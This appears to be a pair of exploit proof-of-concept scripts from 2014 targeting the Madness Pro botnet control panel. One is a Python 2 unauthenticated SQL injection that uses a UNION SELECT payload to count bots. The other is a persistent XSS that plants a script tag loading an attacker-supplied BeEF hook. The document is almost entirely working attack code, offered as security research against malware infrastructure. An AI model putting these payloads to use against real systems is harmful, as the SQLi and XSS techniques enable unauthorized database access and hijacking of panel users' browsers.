

Type: SQLi<br>
Vuln: http://localhost/?uid=<br>
Author: [bwall](https://twitter.com/botnet_hunter)<br>
```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Exploit Title: Madness Pro <= 1.14 SQL injection
# Date: June 05, 2014
# Exploit Author: @botnet_hunter
# Version: 1.14
# Tested on: Apache2 - Ubuntu - MySQL
# Unauthenticated SQL injection in Madness Pro panel <= 1.14
# Proof of Concept retrieves a count of the bots, although it can be utilized for far more
# Discovered and developed by bwall @botnet_hunter
#
# References:
#   http://blog.cylance.com/a-study-in-bots-lobotomy
#   
import urllib
 
# Fill in URL that Madness Pro bot connects back to
panel_url = ""
 
 
def run_sqli_proof_of_concept(panel_index_url):
    f = urllib.urlopen("{0}?uid='%20OR%201=2%20UNION%20ALL%20SELECT%201,1,1,CONCAT('bot-count:',COUNT(*))%20FROM%20bots"
                       "%20--%20--".format(panel_index_url))
    print f.read()
 
run_sqli_proof_of_concept(panel_url)
```


Type: Persitent XSS<br>
Vuln: http://localhost/?uid=<br>
Author: [bwall](https://twitter.com/botnet_hunter)<br>
```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Exploit Title: Madness Pro <= 1.14 Persistent XSS
# Date: June 05, 2014
# Exploit Author: @botnet_hunter
# Version: 1.14
# Tested on: Apache2 - Ubuntu - MySQL
# Unauthenticated persistent XSS in Madness Pro panel <= 1.14
# Discovered and developed by bwall @botnet_hunter
#
# References:
#   http://blog.cylance.com/a-study-in-bots-lobotomy
#   
import urllib
 
# Fill in URL that Madness Pro bot connects back to
panel_url = ""
# Fill in URL to your Javascript payload (the shorter the better)
beef_hook = ""
 
 
def install_beef_hook(beef_hook_url, panel_index_url):
    f = urllib.urlopen("{0}?uid=12345%3Cimg%20alt%3D\\')%3B%5C%22%3E%3Cscript%20src=\"{1}\">%3C%2Fscript%3E%3C%2Fa%3E"
                       "%3Ca%20href%3D%22%23%22%20onclick%3D%5C%22set_status(\\'12345".format(panel_index_url,
                                                                                              beef_hook_url))
    print f.read()
 
install_beef_hook(beef_hook, panel_url)
```
